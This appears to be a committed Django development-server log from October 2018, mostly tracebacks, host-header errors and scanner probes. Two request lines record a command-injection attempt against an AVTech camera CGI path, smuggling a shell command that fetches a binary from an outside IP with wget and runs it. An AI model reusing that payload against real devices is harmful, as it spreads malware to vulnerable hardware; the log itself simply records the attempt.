+[22/Oct/2018 15:46:00] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64444
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[22/Oct/2018 15:46:00] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 16:04:40] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 16:49:01] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 18:29:54] "GET / HTTP/1.0" 400 60209
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 19:27:01] "GET / HTTP/1.0" 400 60211
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 19:58:20] "GET / HTTP/1.0" 400 60210
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Oct/2018 21:28:57] "GET / HTTP/1.0" 400 60211
+[23/Oct/2018 01:09:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[23/Oct/2018 01:09:43] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 05:25:32] "GET / HTTP/1.0" 400 60211
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[23/Oct/2018 05:25:32] "GET / HTTP/1.0" 500 59
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.5/socket.py", line 593, in write
+    return self._sock.send(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/venvDir/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 05:46:21] "GET / HTTP/1.0" 400 60209
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 07:02:14] "GET / HTTP/1.0" 400 60210
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 08:16:12] "GET / HTTP/1.0" 400 60209
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 08:22:12] "GET / HTTP/1.0" 400 60209
+[23/Oct/2018 08:41:56] "GET / HTTP/1.1" 200 1372
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 10:09:26] "GET / HTTP/1.0" 400 60210
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Oct/2018 15:18:08] "GET / HTTP/1.0" 400 60211
+[23/Oct/2018 17:12:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[23/Oct/2018 17:12:28] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'test:8000'. You may need to add 'test' to ALLOWED_HOSTS.
+Bad Request: /
+[24/Oct/2018 09:34:24] "GET / HTTP/1.0" 400 60211
